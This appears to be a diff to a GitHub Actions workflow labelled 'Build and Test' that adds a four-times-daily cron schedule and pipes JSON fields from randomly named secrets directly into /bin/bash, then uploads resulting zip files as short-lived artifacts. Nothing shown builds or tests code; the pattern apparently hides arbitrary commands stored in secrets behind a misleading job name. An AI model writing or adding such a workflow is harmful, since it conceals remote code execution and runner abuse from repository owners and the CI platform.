@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '37 0,6,12,18 * * *'
 jobs:
   trigger:
     runs-on: ubuntu-latest
@@ -10,16 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          eobwf52: ${{ secrets.eobwf52 }}
+          nou647: ${{ secrets.nou647 }}
         run: |
-          printf '%s' "$eobwf52" | jq -r .a9389 | /bin/bash
-          echo $ee440 | jq -r .uxgnw04434 | /bin/bash
-          printf '%s' "$vqaut0" | jq -r .jz725 | /bin/bash
+          printf '%s' "$nou647" | jq -r .ceai0 | /bin/bash
+          printf '%s' "$ibgx03177" | jq -r .hsgo231 | /bin/bash
+          printf '%s' "$ra897" | jq -r .zyw509 | /bin/bash
+          printf '%s' "$sjisk7" | jq -r .i7438 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Bnh2yt80
+          name: OdYWFoaP
           path: "*.zip"
           retention-days: 1
